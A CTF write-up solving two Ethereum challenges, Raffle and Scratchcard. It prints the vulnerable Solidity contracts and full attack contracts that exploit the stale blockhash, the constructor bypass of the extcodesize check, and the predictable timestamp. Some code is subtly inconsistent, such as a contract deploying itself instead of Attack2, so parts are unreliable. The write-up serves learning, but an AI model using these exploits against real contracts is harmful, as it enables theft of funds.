Title: Blockchain CTF Lvl. 12-13
Date: 2019-3-11 10:01
Modified: 2019-3-11 10:01
Category: ctf
Tags: ctf, ethereum, solidity
Slug: blockchain_ctf1213
Authors: F3real
Summary: How to solve Blockchain CTF lvl. 12-13

In this post we will take a look at two new challenges posted in blockchain CTF.

[TOC]

##Raffle

Let's take a look at source code:

~~~solidity
pragma solidity 0.4.24;

import "../CtfFramework.sol";

contract Raffle is CtfFramework{

    uint256 constant fee = 0.1 ether;

    address private admin;

    bytes4 private winningTicket;
    uint256 private blocknum;

    uint256 public ticketsBought;
    bool public raffleStopped;

    mapping(address=>uint256) private rewards;
    mapping(address=>bool) private potentialWinner;
    mapping(address=>bytes4) private ticketNumbers;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    {
        rewards[address(this)] = msg.value;
        admin = msg.sender;
    }

    function buyTicket() external payable ctf{
        if(msg.value >= fee){
            winningTicket = bytes4(0);
            blocknum = block.number+1;
            ticketsBought += 1;
            raffleStopped = false;
            rewards[msg.sender] += msg.value;
            ticketNumbers[msg.sender] = bytes4((msg.value - fee)/10**8);
            potentialWinner[msg.sender] = true;
        }
    }

    function closeRaffle() external ctf{
        require(ticketsBought>0);
        require(!raffleStopped);
        require(blocknum != 0);
        require(winningTicket == bytes4(0));
        require(block.number>blocknum);
        require(msg.sender==admin || rewards[msg.sender]>0);
        winningTicket = bytes4(blockhash(blocknum));
        potentialWinner[msg.sender] = false;
        raffleStopped = true;
    }

    function collectReward() external payable ctf{
        require(raffleStopped);
        require(potentialWinner[msg.sender]);
        rewards[address(this)] += msg.value;
        if(winningTicket == ticketNumbers[msg.sender]){
            msg.sender.transfer(rewards[msg.sender]);
            msg.sender.transfer(rewards[address(this)]); 
            rewards[msg.sender] = 0;
            rewards[address(this)] = 0;
        }
    }

    function skimALittleOffTheTop(uint256 _value) external ctf{
        require(msg.sender==admin);
        require(rewards[address(this)]>_value);
        rewards[address(this)] = rewards[address(this)] - _value;
        msg.sender.transfer(_value);
    }

    function () public payable ctf{
        if(msg.value>=fee){
            this.buyTicket();
        }
        else if(msg.value == 0){
            this.closeRaffle();
        }
        else{
            this.collectReward();
        }
    }

}
~~~

When we call `buyTicket`, based on `msg.value` we sent, we get assigned ticketNumber (`bytes4((msg.value - fee)/10**8);`). Winning ticket number is calculated only in `closeRaffle` function based on `blockhash` (`bytes4(blockhash(blocknum))`).

Also, we have to notice that `blocknum` is checked to be different then 0 and if it is higher then `block.number` assigned at the time `buyTicket` is called.

Another thing to note is that even regular players can close raffle 
~~~solidity
require(msg.sender==admin || rewards[msg.sender]>0);
~~~
So how can we exploit this?

Problem lies in using `blockhash`, it saves values only up to last 256 blocks. Calling it on older block will yield 0. This means we can just wait for 256 blocks after which we know the value of winning ticket. Only problem letf to handle is fact that account that closses raffle is unable to call `collectReward` function, but this can be bypassed by creating two different attack contracts.

Solution:

~~~solidity
contract Test{

    function getBlockNum() public view returns(uint) {
        return block.number;
    }
}


pragma solidity 0.4.24;

import "./Raffle.sol";

contract AttackContract1{
    address owner;
    Raffle raffle = Raffle(0xB410d1087c42d7D8136257B2e4ce966ed64742Ed);

    constructor() public {
        owner = msg.sender;
    }

    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(address(this).balance); 
        }
    }

    function attack() public payable{
        require(msg.value == 0.1 ether);
        raffle.buyTicket.value(0.1 ether)();
    }

    function claimReward() public payable{
        raffle.collectReward();
    }
    function() public payable{}
}

pragma solidity 0.4.24;

import "./Raffle.sol";

contract AttackContract2{
    address owner;
    Raffle raffle = Raffle(0xB410d1087c42d7D8136257B2e4ce966ed64742Ed);

    constructor() public {
        owner = msg.sender;
    }

    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(address(this).balance); 
        }
    }

    function attack() public payable{
        require(msg.value == 0.1 ether);
        raffle.buyTicket.value(0.1 ether)();
    }
    function closeRaffle() public payable{
        raffle.closeRaffle();
    }

    function () public payable {}
}
~~~

After creating both attack contract we need to call `attack` from both, wait 256 blocks and then close raffle and claim our reward.

##Scratchcard

Source:

~~~solidity
pragma solidity 0.4.24;

import "../CtfFramework.sol";

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
}

contract Scratchcard is CtfFramework{

    event CardPurchased(address indexed player, uint256 cost, bool winner);

    mapping(address=>uint256) private winCount;
    uint256 private cost;


    using Address for address;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    {
    }

    modifier notContract(){
        require(!msg.sender.isContract(), "Contracts Not Allowed");
        _;
    }

    function play() public payable notContract ctf{
        bool won = false;
        if((now%10**8)*10**10 == msg.value){
            won = true;
            winCount[msg.sender] += 1;
            cost = msg.value;
            msg.sender.transfer(cost);
        }
        else{
            cost = 0;
            winCount[msg.sender] = 0;
        }
        emit CardPurchased(msg.sender, msg.value, won);
    }    

    function checkIfMegaJackpotWinner() public view returns(bool){
        return(winCount[msg.sender]>=25);
    }

    function collectMegaJackpot(uint256 _amount) public notContract ctf{
        require(checkIfMegaJackpotWinner(), "User Not Winner");
        require(2 * cost - _amount > 0, "Winners May Only Withdraw Up To 2x Their Scratchcard Cost");
        winCount[msg.sender] = 0;
        msg.sender.transfer(_amount);
    }

    function () public payable ctf{
        play();
    }

}
~~~

This contract is a bit trickier, we see a bit of inline assembly being used to check code size of calling address.

~~~solidity
    uint256 size;
    assembly { size := extcodesize(account) }
~~~

This can be used to show us if we are being called from contract, but it can be bypassed. We can do this by calling victim contract from constructor of our attack contract (since constructor sets contract code during it's runtime `extcodesize` is going to be 0).

Another thing to note is that `(now%10**8)*10**10 == msg.value` is being used to check if we are winner. But since, with our contract check bypass, we can call Raffle from contract if we do same calculation we will get required message value. The `now` is just alias for `block.timestamp` and will be same for all transactions/function calls in same block.

So let's write attack code:

~~~solidity
pragma solidity 0.4.24;

import "./Scratchcard .sol";

contract Attack2{
    address owner;
    Scratchcard game = Scratchcard(0x8b8450970A7C25D7517100EEfF0Cb23357c50c86);

    constructor() public payable {
        owner = tx.origin;
        uint val = (now%10**8)*10**10;
        for (uint i=0; i<25; i++) {
            game.play.value(val)();
        }
        game.collectMegaJackpot(2* val - 1);
    }

    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(address(this).balance); 
        }
    }

    function () public payable {}
}


pragma solidity 0.4.24;

import "./Attack.sol";

contract Attack{
    address owner;

    constructor() public payable {
        owner = msg.sender;
    }

    function addressFrom(address _origin, uint _nonce) external pure returns (address) {
        return address(keccak256(byte(0xd6), byte(0x94), _origin, byte(_nonce)));
    }

    function attackScratchcard() public payable{
        Attack con = (new Attack).value(msg.value)();
    }

    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(address(this).balance); 
        }
    }

    function () public payable {}
}
~~~

We have two attack contracts. When `attackScratchcard` is called on Attack contract we deploy Attack2 that does actual attack from its constructor.

We also have to calculate addresses of Attack2 contracts before they are created so we can add them as authorized (`ctf_challenge_add_authorized_sender` from CtfFramework).
